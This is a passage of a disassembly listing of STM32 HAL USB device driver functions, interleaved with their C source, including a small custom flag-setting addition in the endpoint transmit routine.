 8002480:	705a      	strb	r2, [r3, #1]
 8002482:	e00e      	b.n	80024a2 <HAL_PCD_EP_Close+0x50>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002484:	78fb      	ldrb	r3, [r7, #3]
 8002486:	f003 0207 	and.w	r2, r3, #7
 800248a:	4613      	mov	r3, r2
 800248c:	009b      	lsls	r3, r3, #2
 800248e:	4413      	add	r3, r2
 8002490:	00db      	lsls	r3, r3, #3
 8002492:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002496:	687a      	ldr	r2, [r7, #4]
 8002498:	4413      	add	r3, r2
 800249a:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 800249c:	68fb      	ldr	r3, [r7, #12]
 800249e:	2200      	movs	r2, #0
 80024a0:	705a      	strb	r2, [r3, #1]
  }
  ep->num = ep_addr & EP_ADDR_MSK;
 80024a2:	78fb      	ldrb	r3, [r7, #3]
 80024a4:	f003 0307 	and.w	r3, r3, #7
 80024a8:	b2da      	uxtb	r2, r3
 80024aa:	68fb      	ldr	r3, [r7, #12]
 80024ac:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 80024ae:	687b      	ldr	r3, [r7, #4]
 80024b0:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80024b4:	2b01      	cmp	r3, #1
 80024b6:	d101      	bne.n	80024bc <HAL_PCD_EP_Close+0x6a>
 80024b8:	2302      	movs	r3, #2
 80024ba:	e00e      	b.n	80024da <HAL_PCD_EP_Close+0x88>
 80024bc:	687b      	ldr	r3, [r7, #4]
 80024be:	2201      	movs	r2, #1
 80024c0:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_DeactivateEndpoint(hpcd->Instance, ep);
 80024c4:	687b      	ldr	r3, [r7, #4]
 80024c6:	681b      	ldr	r3, [r3, #0]
 80024c8:	68f9      	ldr	r1, [r7, #12]
 80024ca:	4618      	mov	r0, r3
 80024cc:	f004 fa08 	bl	80068e0 <USB_DeactivateEndpoint>
  __HAL_UNLOCK(hpcd);
 80024d0:	687b      	ldr	r3, [r7, #4]
 80024d2:	2200      	movs	r2, #0
 80024d4:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  return HAL_OK;
 80024d8:	2300      	movs	r3, #0
}
 80024da:	4618      	mov	r0, r3
 80024dc:	3710      	adds	r7, #16
 80024de:	46bd      	mov	sp, r7
 80024e0:	bd80      	pop	{r7, pc}

080024e2 <HAL_PCD_EP_Receive>:
  * @param  pBuf pointer to the reception buffer
  * @param  len amount of data to be received
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Receive(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 80024e2:	b580      	push	{r7, lr}
 80024e4:	b086      	sub	sp, #24
 80024e6:	af00      	add	r7, sp, #0
 80024e8:	60f8      	str	r0, [r7, #12]
 80024ea:	607a      	str	r2, [r7, #4]
 80024ec:	603b      	str	r3, [r7, #0]
 80024ee:	460b      	mov	r3, r1
 80024f0:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80024f2:	7afb      	ldrb	r3, [r7, #11]
 80024f4:	f003 0207 	and.w	r2, r3, #7
 80024f8:	4613      	mov	r3, r2
 80024fa:	009b      	lsls	r3, r3, #2
 80024fc:	4413      	add	r3, r2
 80024fe:	00db      	lsls	r3, r3, #3
 8002500:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002504:	68fa      	ldr	r2, [r7, #12]
 8002506:	4413      	add	r3, r2
 8002508:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 800250a:	697b      	ldr	r3, [r7, #20]
 800250c:	687a      	ldr	r2, [r7, #4]
 800250e:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 8002510:	697b      	ldr	r3, [r7, #20]
 8002512:	683a      	ldr	r2, [r7, #0]
 8002514:	619a      	str	r2, [r3, #24]
  ep->xfer_count = 0U;
 8002516:	697b      	ldr	r3, [r7, #20]
 8002518:	2200      	movs	r2, #0
 800251a:	61da      	str	r2, [r3, #28]
  ep->is_in = 0U;
 800251c:	697b      	ldr	r3, [r7, #20]
 800251e:	2200      	movs	r2, #0
 8002520:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002522:	7afb      	ldrb	r3, [r7, #11]
 8002524:	f003 0307 	and.w	r3, r3, #7
 8002528:	b2da      	uxtb	r2, r3
 800252a:	697b      	ldr	r3, [r7, #20]
 800252c:	701a      	strb	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 800252e:	68fb      	ldr	r3, [r7, #12]
 8002530:	681b      	ldr	r3, [r3, #0]
 8002532:	6979      	ldr	r1, [r7, #20]
 8002534:	4618      	mov	r0, r3
 8002536:	f004 fbc0 	bl	8006cba <USB_EPStartXfer>

  return HAL_OK;
 800253a:	2300      	movs	r3, #0
}
 800253c:	4618      	mov	r0, r3
 800253e:	3718      	adds	r7, #24
 8002540:	46bd      	mov	sp, r7
 8002542:	bd80      	pop	{r7, pc}

08002544 <HAL_PCD_EP_GetRxCount>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval Data Size
  */
uint32_t HAL_PCD_EP_GetRxCount(PCD_HandleTypeDef const *hpcd, uint8_t ep_addr)
{
 8002544:	b480      	push	{r7}
 8002546:	b083      	sub	sp, #12
 8002548:	af00      	add	r7, sp, #0
 800254a:	6078      	str	r0, [r7, #4]
 800254c:	460b      	mov	r3, r1
 800254e:	70fb      	strb	r3, [r7, #3]
  return hpcd->OUT_ep[ep_addr & EP_ADDR_MSK].xfer_count;
 8002550:	78fb      	ldrb	r3, [r7, #3]
 8002552:	f003 0207 	and.w	r2, r3, #7
 8002556:	6879      	ldr	r1, [r7, #4]
 8002558:	4613      	mov	r3, r2
 800255a:	009b      	lsls	r3, r3, #2
 800255c:	4413      	add	r3, r2
 800255e:	00db      	lsls	r3, r3, #3
 8002560:	440b      	add	r3, r1
 8002562:	f503 73c2 	add.w	r3, r3, #388	; 0x184
 8002566:	681b      	ldr	r3, [r3, #0]
}
 8002568:	4618      	mov	r0, r3
 800256a:	370c      	adds	r7, #12
 800256c:	46bd      	mov	sp, r7
 800256e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8002572:	4770      	bx	lr

08002574 <HAL_PCD_EP_Transmit>:
  * @param  pBuf pointer to the transmission buffer
  * @param  len amount of data to be sent
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Transmit(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 8002574:	b580      	push	{r7, lr}
 8002576:	b086      	sub	sp, #24
 8002578:	af00      	add	r7, sp, #0
 800257a:	60f8      	str	r0, [r7, #12]
 800257c:	607a      	str	r2, [r7, #4]
 800257e:	603b      	str	r3, [r7, #0]
 8002580:	460b      	mov	r3, r1
 8002582:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 8002584:	7afb      	ldrb	r3, [r7, #11]
 8002586:	f003 0307 	and.w	r3, r3, #7
 800258a:	1c5a      	adds	r2, r3, #1
 800258c:	4613      	mov	r3, r2
 800258e:	009b      	lsls	r3, r3, #2
 8002590:	4413      	add	r3, r2
 8002592:	00db      	lsls	r3, r3, #3
 8002594:	68fa      	ldr	r2, [r7, #12]
 8002596:	4413      	add	r3, r2
 8002598:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 800259a:	697b      	ldr	r3, [r7, #20]
 800259c:	687a      	ldr	r2, [r7, #4]
 800259e:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 80025a0:	697b      	ldr	r3, [r7, #20]
 80025a2:	683a      	ldr	r2, [r7, #0]
 80025a4:	619a      	str	r2, [r3, #24]
#if defined (USB)
  ep->xfer_fill_db = 1U;
 80025a6:	697b      	ldr	r3, [r7, #20]
 80025a8:	2201      	movs	r2, #1
 80025aa:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  ep->xfer_len_db = len;
 80025ae:	697b      	ldr	r3, [r7, #20]
 80025b0:	683a      	ldr	r2, [r7, #0]
 80025b2:	621a      	str	r2, [r3, #32]
#endif /* defined (USB) */
  ep->xfer_count = 0U;
 80025b4:	697b      	ldr	r3, [r7, #20]
 80025b6:	2200      	movs	r2, #0
 80025b8:	61da      	str	r2, [r3, #28]
  ep->is_in = 1U;
 80025ba:	697b      	ldr	r3, [r7, #20]
 80025bc:	2201      	movs	r2, #1
 80025be:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 80025c0:	7afb      	ldrb	r3, [r7, #11]
 80025c2:	f003 0307 	and.w	r3, r3, #7
 80025c6:	b2da      	uxtb	r2, r3
 80025c8:	697b      	ldr	r3, [r7, #20]
 80025ca:	701a      	strb	r2, [r3, #0]

  //Determine whether to generate an interrupt:
  if((recv_buffer[0]&0x02) != 0x02)
 80025cc:	4b0e      	ldr	r3, [pc, #56]	; (8002608 <HAL_PCD_EP_Transmit+0x94>)
 80025ce:	781b      	ldrb	r3, [r3, #0]
 80025d0:	f003 0302 	and.w	r3, r3, #2
 80025d4:	2b00      	cmp	r3, #0
 80025d6:	d102      	bne.n	80025de <HAL_PCD_EP_Transmit+0x6a>
	  InterruptFlag = 1;
 80025d8:	4b0c      	ldr	r3, [pc, #48]	; (800260c <HAL_PCD_EP_Transmit+0x98>)
 80025da:	2201      	movs	r2, #1
 80025dc:	601a      	str	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 80025de:	68fb      	ldr	r3, [r7, #12]
 80025e0:	681b      	ldr	r3, [r3, #0]
 80025e2:	6979      	ldr	r1, [r7, #20]
 80025e4:	4618      	mov	r0, r3
 80025e6:	f004 fb68 	bl	8006cba <USB_EPStartXfer>

  //Output test to choose whether to RollBack:
  if((recv_buffer[0]&0x02) != 0x02)
 80025ea:	4b07      	ldr	r3, [pc, #28]	; (8002608 <HAL_PCD_EP_Transmit+0x94>)
 80025ec:	781b      	ldrb	r3, [r3, #0]
 80025ee:	f003 0302 	and.w	r3, r3, #2
 80025f2:	2b00      	cmp	r3, #0
 80025f4:	d102      	bne.n	80025fc <HAL_PCD_EP_Transmit+0x88>
	  NeedRollBack = 1;
 80025f6:	4b06      	ldr	r3, [pc, #24]	; (8002610 <HAL_PCD_EP_Transmit+0x9c>)
 80025f8:	2201      	movs	r2, #1
 80025fa:	601a      	str	r2, [r3, #0]
  return HAL_OK;
 80025fc:	2300      	movs	r3, #0
}
 80025fe:	4618      	mov	r0, r3
 8002600:	3718      	adds	r7, #24
 8002602:	46bd      	mov	sp, r7
 8002604:	bd80      	pop	{r7, pc}
 8002606:	bf00      	nop
 8002608:	2000026c 	.word	0x2000026c
 800260c:	20000270 	.word	0x20000270
 8002610:	2000027c 	.word	0x2000027c

08002614 <HAL_PCD_EP_SetStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_SetStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002614:	b580      	push	{r7, lr}
 8002616:	b084      	sub	sp, #16
 8002618:	af00      	add	r7, sp, #0
 800261a:	6078      	str	r0, [r7, #4]
 800261c:	460b      	mov	r3, r1
 800261e:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & EP_ADDR_MSK) > hpcd->Init.dev_endpoints)
 8002620:	78fb      	ldrb	r3, [r7, #3]
 8002622:	f003 0207 	and.w	r2, r3, #7
 8002626:	687b      	ldr	r3, [r7, #4]
 8002628:	685b      	ldr	r3, [r3, #4]
 800262a:	429a      	cmp	r2, r3
 800262c:	d901      	bls.n	8002632 <HAL_PCD_EP_SetStall+0x1e>
  {
    return HAL_ERROR;
 800262e:	2301      	movs	r3, #1
 8002630:	e04c      	b.n	80026cc <HAL_PCD_EP_SetStall+0xb8>
  }

  if ((0x80U & ep_addr) == 0x80U)
 8002632:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002636:	2b00      	cmp	r3, #0
 8002638:	da0e      	bge.n	8002658 <HAL_PCD_EP_SetStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800263a:	78fb      	ldrb	r3, [r7, #3]
 800263c:	f003 0307 	and.w	r3, r3, #7
 8002640:	1c5a      	adds	r2, r3, #1
 8002642:	4613      	mov	r3, r2
 8002644:	009b      	lsls	r3, r3, #2
 8002646:	4413      	add	r3, r2
 8002648:	00db      	lsls	r3, r3, #3
 800264a:	687a      	ldr	r2, [r7, #4]
 800264c:	4413      	add	r3, r2
 800264e:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002650:	68fb      	ldr	r3, [r7, #12]
 8002652:	2201      	movs	r2, #1
 8002654:	705a      	strb	r2, [r3, #1]
 8002656:	e00c      	b.n	8002672 <HAL_PCD_EP_SetStall+0x5e>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 8002658:	78fa      	ldrb	r2, [r7, #3]
 800265a:	4613      	mov	r3, r2
 800265c:	009b      	lsls	r3, r3, #2
 800265e:	4413      	add	r3, r2
 8002660:	00db      	lsls	r3, r3, #3
 8002662:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002666:	687a      	ldr	r2, [r7, #4]
 8002668:	4413      	add	r3, r2
 800266a:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 800266c:	68fb      	ldr	r3, [r7, #12]
 800266e:	2200      	movs	r2, #0
 8002670:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 1U;
 8002672:	68fb      	ldr	r3, [r7, #12]
 8002674:	2201      	movs	r2, #1
 8002676:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002678:	78fb      	ldrb	r3, [r7, #3]
 800267a:	f003 0307 	and.w	r3, r3, #7
 800267e:	b2da      	uxtb	r2, r3
 8002680:	68fb      	ldr	r3, [r7, #12]
 8002682:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 8002684:	687b      	ldr	r3, [r7, #4]
 8002686:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 800268a:	2b01      	cmp	r3, #1
 800268c:	d101      	bne.n	8002692 <HAL_PCD_EP_SetStall+0x7e>
 800268e:	2302      	movs	r3, #2
 8002690:	e01c      	b.n	80026cc <HAL_PCD_EP_SetStall+0xb8>
 8002692:	687b      	ldr	r3, [r7, #4]
 8002694:	2201      	movs	r2, #1
 8002696:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  (void)USB_EPSetStall(hpcd->Instance, ep);
 800269a:	687b      	ldr	r3, [r7, #4]
 800269c:	681b      	ldr	r3, [r3, #0]
 800269e:	68f9      	ldr	r1, [r7, #12]
 80026a0:	4618      	mov	r0, r3
 80026a2:	f005 febb 	bl	800841c <USB_EPSetStall>

  if ((ep_addr & EP_ADDR_MSK) == 0U)
 80026a6:	78fb      	ldrb	r3, [r7, #3]
 80026a8:	f003 0307 	and.w	r3, r3, #7
 80026ac:	2b00      	cmp	r3, #0
 80026ae:	d108      	bne.n	80026c2 <HAL_PCD_EP_SetStall+0xae>
  {
    (void)USB_EP0_OutStart(hpcd->Instance, (uint8_t *)hpcd->Setup);
 80026b0:	687b      	ldr	r3, [r7, #4]
 80026b2:	681a      	ldr	r2, [r3, #0]
 80026b4:	687b      	ldr	r3, [r7, #4]
 80026b6:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 80026ba:	4619      	mov	r1, r3
 80026bc:	4610      	mov	r0, r2
 80026be:	f005 fffc 	bl	80086ba <USB_EP0_OutStart>
  }

  __HAL_UNLOCK(hpcd);
 80026c2:	687b      	ldr	r3, [r7, #4]
 80026c4:	2200      	movs	r2, #0
 80026c6:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 80026ca:	2300      	movs	r3, #0
}
 80026cc:	4618      	mov	r0, r3
 80026ce:	3710      	adds	r7, #16
 80026d0:	46bd      	mov	sp, r7
 80026d2:	bd80      	pop	{r7, pc}

080026d4 <HAL_PCD_EP_ClrStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_ClrStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 80026d4:	b580      	push	{r7, lr}
 80026d6:	b084      	sub	sp, #16
 80026d8:	af00      	add	r7, sp, #0
 80026da:	6078      	str	r0, [r7, #4]
 80026dc:	460b      	mov	r3, r1
 80026de:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & 0x0FU) > hpcd->Init.dev_endpoints)
 80026e0:	78fb      	ldrb	r3, [r7, #3]
 80026e2:	f003 020f 	and.w	r2, r3, #15
 80026e6:	687b      	ldr	r3, [r7, #4]
 80026e8:	685b      	ldr	r3, [r3, #4]
 80026ea:	429a      	cmp	r2, r3
 80026ec:	d901      	bls.n	80026f2 <HAL_PCD_EP_ClrStall+0x1e>
  {
    return HAL_ERROR;
 80026ee:	2301      	movs	r3, #1
 80026f0:	e040      	b.n	8002774 <HAL_PCD_EP_ClrStall+0xa0>
  }

  if ((0x80U & ep_addr) == 0x80U)
 80026f2:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80026f6:	2b00      	cmp	r3, #0
 80026f8:	da0e      	bge.n	8002718 <HAL_PCD_EP_ClrStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80026fa:	78fb      	ldrb	r3, [r7, #3]
 80026fc:	f003 0307 	and.w	r3, r3, #7
 8002700:	1c5a      	adds	r2, r3, #1
 8002702:	4613      	mov	r3, r2
 8002704:	009b      	lsls	r3, r3, #2
 8002706:	4413      	add	r3, r2
 8002708:	00db      	lsls	r3, r3, #3
 800270a:	687a      	ldr	r2, [r7, #4]
 800270c:	4413      	add	r3, r2
 800270e:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002710:	68fb      	ldr	r3, [r7, #12]
 8002712:	2201      	movs	r2, #1
 8002714:	705a      	strb	r2, [r3, #1]
 8002716:	e00e      	b.n	8002736 <HAL_PCD_EP_ClrStall+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002718:	78fb      	ldrb	r3, [r7, #3]
 800271a:	f003 0207 	and.w	r2, r3, #7
 800271e:	4613      	mov	r3, r2
 8002720:	009b      	lsls	r3, r3, #2
 8002722:	4413      	add	r3, r2
 8002724:	00db      	lsls	r3, r3, #3
 8002726:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800272a:	687a      	ldr	r2, [r7, #4]
 800272c:	4413      	add	r3, r2
 800272e:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 8002730:	68fb      	ldr	r3, [r7, #12]
 8002732:	2200      	movs	r2, #0
 8002734:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 0U;
 8002736:	68fb      	ldr	r3, [r7, #12]
 8002738:	2200      	movs	r2, #0
 800273a:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 800273c:	78fb      	ldrb	r3, [r7, #3]
 800273e:	f003 0307 	and.w	r3, r3, #7
 8002742:	b2da      	uxtb	r2, r3
 8002744:	68fb      	ldr	r3, [r7, #12]
 8002746:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 8002748:	687b      	ldr	r3, [r7, #4]
 800274a:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 800274e:	2b01      	cmp	r3, #1
 8002750:	d101      	bne.n	8002756 <HAL_PCD_EP_ClrStall+0x82>
 8002752:	2302      	movs	r3, #2
 8002754:	e00e      	b.n	8002774 <HAL_PCD_EP_ClrStall+0xa0>
 8002756:	687b      	ldr	r3, [r7, #4]
 8002758:	2201      	movs	r2, #1
 800275a:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_EPClearStall(hpcd->Instance, ep);
 800275e:	687b      	ldr	r3, [r7, #4]
 8002760:	681b      	ldr	r3, [r3, #0]
 8002762:	68f9      	ldr	r1, [r7, #12]
 8002764:	4618      	mov	r0, r3
 8002766:	f005 feaa 	bl	80084be <USB_EPClearStall>
  __HAL_UNLOCK(hpcd);
 800276a:	687b      	ldr	r3, [r7, #4]
 800276c:	2200      	movs	r2, #0
 800276e:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8002772:	2300      	movs	r3, #0
}
 8002774:	4618      	mov	r0, r3
 8002776:	3710      	adds	r7, #16
 8002778:	46bd      	mov	sp, r7
 800277a:	bd80      	pop	{r7, pc}

0800277c <HAL_PCD_EP_Flush>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Flush(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 800277c:	b580      	push	{r7, lr}
 800277e:	b082      	sub	sp, #8
 8002780:	af00      	add	r7, sp, #0
 8002782:	6078      	str	r0, [r7, #4]
 8002784:	460b      	mov	r3, r1
 8002786:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 8002788:	687b      	ldr	r3, [r7, #4]
 800278a:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 800278e:	2b01      	cmp	r3, #1
 8002790:	d101      	bne.n	8002796 <HAL_PCD_EP_Flush+0x1a>
 8002792:	2302      	movs	r3, #2
 8002794:	e01b      	b.n	80027ce <HAL_PCD_EP_Flush+0x52>
 8002796:	687b      	ldr	r3, [r7, #4]
 8002798:	2201      	movs	r2, #1
 800279a:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  if ((ep_addr & 0x80U) == 0x80U)
 800279e:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80027a2:	2b00      	cmp	r3, #0
 80027a4:	da09      	bge.n	80027ba <HAL_PCD_EP_Flush+0x3e>
  {
    (void)USB_FlushTxFifo(hpcd->Instance, (uint32_t)ep_addr & EP_ADDR_MSK);
 80027a6:	687b      	ldr	r3, [r7, #4]
 80027a8:	681a      	ldr	r2, [r3, #0]
 80027aa:	78fb      	ldrb	r3, [r7, #3]
 80027ac:	f003 0307 	and.w	r3, r3, #7
 80027b0:	4619      	mov	r1, r3
 80027b2:	4610      	mov	r0, r2
 80027b4:	f003 fcb8 	bl	8006128 <USB_FlushTxFifo>
 80027b8:	e004      	b.n	80027c4 <HAL_PCD_EP_Flush+0x48>
  }
  else
  {
    (void)USB_FlushRxFifo(hpcd->Instance);
 80027ba:	687b      	ldr	r3, [r7, #4]
 80027bc:	681b      	ldr	r3, [r3, #0]
 80027be:	4618      	mov	r0, r3
 80027c0:	f003 fcbe 	bl	8006140 <USB_FlushRxFifo>
  }

  __HAL_UNLOCK(hpcd);
 80027c4:	687b      	ldr	r3, [r7, #4]
 80027c6:	2200      	movs	r2, #0
 80027c8:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 80027cc:	2300      	movs	r3, #0
}
 80027ce:	4618      	mov	r0, r3
 80027d0:	3708      	adds	r7, #8
 80027d2:	46bd      	mov	sp, r7
 80027d4:	bd80      	pop	{r7, pc}

080027d6 <PCD_EP_ISR_Handler>:
  * @brief  This function handles PCD Endpoint interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
static HAL_StatusTypeDef PCD_EP_ISR_Handler(PCD_HandleTypeDef *hpcd)
{
 80027d6:	b580      	push	{r7, lr}
 80027d8:	b096      	sub	sp, #88	; 0x58
 80027da:	af00      	add	r7, sp, #0
 80027dc:	6078      	str	r0, [r7, #4]
#if (USE_USB_DOUBLE_BUFFER != 1U)
  count = 0U;
#endif /* USE_USB_DOUBLE_BUFFER */

  /* stay in loop while pending interrupts */
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 80027de:	e3b1      	b.n	8002f44 <PCD_EP_ISR_Handler+0x76e>
  {
    wIstr = hpcd->Instance->ISTR;
 80027e0:	687b      	ldr	r3, [r7, #4]
 80027e2:	681b      	ldr	r3, [r3, #0]
 80027e4:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80027e8:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e

    /* extract highest priority endpoint number */
    epindex = (uint8_t)(wIstr & USB_ISTR_EP_ID);
 80027ec:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 80027f0:	b2db      	uxtb	r3, r3
 80027f2:	f003 030f 	and.w	r3, r3, #15
 80027f6:	f887 304d 	strb.w	r3, [r7, #77]	; 0x4d

    if (epindex == 0U)
 80027fa:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 80027fe:	2b00      	cmp	r3, #0
 8002800:	f040 8173 	bne.w	8002aea <PCD_EP_ISR_Handler+0x314>
    {
      /* Decode and service control endpoint interrupt */

      /* DIR bit = origin of the interrupt */
      if ((wIstr & USB_ISTR_DIR) == 0U)
 8002804:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8002808:	f003 0310 	and.w	r3, r3, #16
 800280c:	2b00      	cmp	r3, #0
 800280e:	d150      	bne.n	80028b2 <PCD_EP_ISR_Handler+0xdc>
      {
        /* DIR = 0 */

        /* DIR = 0 => IN  int */
        /* DIR = 0 implies that (EP_CTR_TX = 1) always */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002810:	687b      	ldr	r3, [r7, #4]
 8002812:	681b      	ldr	r3, [r3, #0]
 8002814:	881b      	ldrh	r3, [r3, #0]
 8002816:	b29b      	uxth	r3, r3
 8002818:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 800281c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002820:	81fb      	strh	r3, [r7, #14]
 8002822:	687b      	ldr	r3, [r7, #4]
 8002824:	681a      	ldr	r2, [r3, #0]
 8002826:	89fb      	ldrh	r3, [r7, #14]
 8002828:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800282c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002830:	b29b      	uxth	r3, r3
 8002832:	8013      	strh	r3, [r2, #0]
        ep = &hpcd->IN_ep[0];
 8002834:	687b      	ldr	r3, [r7, #4]
 8002836:	3328      	adds	r3, #40	; 0x28
 8002838:	657b      	str	r3, [r7, #84]	; 0x54

        ep->xfer_count = PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 800283a:	687b      	ldr	r3, [r7, #4]
 800283c:	681b      	ldr	r3, [r3, #0]
 800283e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002842:	b29b      	uxth	r3, r3
 8002844:	461a      	mov	r2, r3
 8002846:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002848:	781b      	ldrb	r3, [r3, #0]
 800284a:	00db      	lsls	r3, r3, #3
 800284c:	4413      	add	r3, r2
 800284e:	687a      	ldr	r2, [r7, #4]
 8002850:	6812      	ldr	r2, [r2, #0]
 8002852:	4413      	add	r3, r2
 8002854:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002858:	881b      	ldrh	r3, [r3, #0]
 800285a:	f3c3 0209 	ubfx	r2, r3, #0, #10
 800285e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002860:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += ep->xfer_count;
 8002862:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002864:	695a      	ldr	r2, [r3, #20]
 8002866:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002868:	69db      	ldr	r3, [r3, #28]
 800286a:	441a      	add	r2, r3
 800286c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800286e:	615a      	str	r2, [r3, #20]

        /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
        hpcd->DataInStageCallback(hpcd, 0U);
#else
        HAL_PCD_DataInStageCallback(hpcd, 0U);
 8002870:	2100      	movs	r1, #0
 8002872:	6878      	ldr	r0, [r7, #4]
 8002874:	f00a f98f 	bl	800cb96 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

        if ((hpcd->USB_Address > 0U) && (ep->xfer_len == 0U))
 8002878:	687b      	ldr	r3, [r7, #4]
 800287a:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 800287e:	b2db      	uxtb	r3, r3
 8002880:	2b00      	cmp	r3, #0
 8002882:	f000 835f 	beq.w	8002f44 <PCD_EP_ISR_Handler+0x76e>
 8002886:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002888:	699b      	ldr	r3, [r3, #24]
 800288a:	2b00      	cmp	r3, #0
 800288c:	f040 835a 	bne.w	8002f44 <PCD_EP_ISR_Handler+0x76e>
        {
          hpcd->Instance->DADDR = ((uint16_t)hpcd->USB_Address | USB_DADDR_EF);
 8002890:	687b      	ldr	r3, [r7, #4]
 8002892:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 8002896:	b2db      	uxtb	r3, r3
 8002898:	f063 037f 	orn	r3, r3, #127	; 0x7f
 800289c:	b2da      	uxtb	r2, r3
 800289e:	687b      	ldr	r3, [r7, #4]
